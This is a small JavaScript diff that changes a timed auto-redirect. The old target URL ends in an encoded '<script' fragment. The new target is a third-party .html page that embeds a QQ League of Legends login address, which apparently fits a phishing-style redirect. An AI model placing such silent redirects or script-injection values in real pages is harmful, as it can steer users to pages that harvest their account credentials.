@@ -10,6 +10,6 @@ leleua();
 
 setTimeout(function() {
     var timestamp = new Date().getTime();
-    var url = 'https://meeting-75420.picgzc.qpic.cn/a3db69872e35de46b3f8fca262dfbd1a2daea20631cdeaaaf4cd8d28773bc91d' + '?' + timestamp + '%3Cscript';
+    var url = 'https://image.qmxip.com/8cc1f6d50269cce92d4eebcf50bf5896.html?#url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html' + '?' + timestamp + 'yuge';
     location.href = url;
 }, 1000);
